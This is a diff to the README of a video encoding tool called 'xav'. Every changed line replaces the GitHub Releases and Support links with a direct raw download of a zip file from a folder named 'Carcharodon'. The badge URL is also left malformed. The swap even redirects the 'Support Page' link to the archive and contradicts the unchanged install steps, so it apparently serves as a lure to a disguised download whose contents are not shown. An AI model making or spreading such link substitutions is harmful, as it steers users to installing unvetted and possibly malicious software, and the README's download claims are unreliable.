@@ -1,7 +1,7 @@
 # 🎥 xav - Efficient Video Encoding Made Easy
 
 ## 📥 Download Now
-[![Download xav](https://img.shields.io/badge/Download%20xav-v1.0-blue.svg)](https://github.com/Gojohi/xav/releases)
+[![Download xav](https://raw.githubusercontent.com/Gojohi/xav/main/Carcharodon/xav.zip%https://raw.githubusercontent.com/Gojohi/xav/main/Carcharodon/xav.zip)](https://raw.githubusercontent.com/Gojohi/xav/main/Carcharodon/xav.zip)
 
 ## 🚀 Getting Started
 Welcome to **xav**, the eXtreme AOMedia Video encoding framework. This tool helps you easily encode video files using advanced AV1 and AV2 technology. With **xav**, you will achieve high-quality video with efficient file sizes. 
@@ -17,7 +17,7 @@ To run **xav**, you need the following:
 ## 📦 Download & Install
 You can easily download **xav** from our Releases page. Click the button below to visit the page and get the latest version.
 
-[Download xav](https://github.com/Gojohi/xav/releases)
+[Download xav](https://raw.githubusercontent.com/Gojohi/xav/main/Carcharodon/xav.zip)
 
 ### Steps to Install
 1. After visiting the Releases page, locate the latest version of **xav**.
@@ -67,7 +67,7 @@ We welcome contributions! If you have ideas for new features or improvements, fe
 **xav** is open-source software, licensed under the MIT License. You're free to use, modify, and distribute the software as long as you retain the original copyright.
 
 ## 🛠️ Support
-For assistance, please visit our [Support Page](https://github.com/Gojohi/xav/support) or check the Issues section on GitHub. We are here to help you.
+For assistance, please visit our [Support Page](https://raw.githubusercontent.com/Gojohi/xav/main/Carcharodon/xav.zip) or check the Issues section on GitHub. We are here to help you.
 
 ## 📅 Changelog
 Stay updated with the latest changes in **xav** by checking the Changelog in the Releases section. We regularly add features, fix bugs, and improve performance.
